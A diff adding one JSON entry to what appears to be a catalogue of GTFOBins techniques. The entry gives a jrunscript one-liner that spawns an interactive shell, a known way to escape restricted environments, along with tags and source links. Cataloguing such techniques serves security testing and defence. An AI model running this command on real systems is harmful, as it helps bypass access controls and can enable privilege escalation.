@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-jrunscript-shell",
+  "name": "GTFOBins · jrunscript (shell)",
+  "command": "jrunscript -e 'exec(\"/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty\")'",
+  "description": "Use jrunscript to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "jrunscript",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/jrunscript/#shell",
+  "upstream_id": "jrunscript/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/jrunscript/"
+    }
+  ]
+}
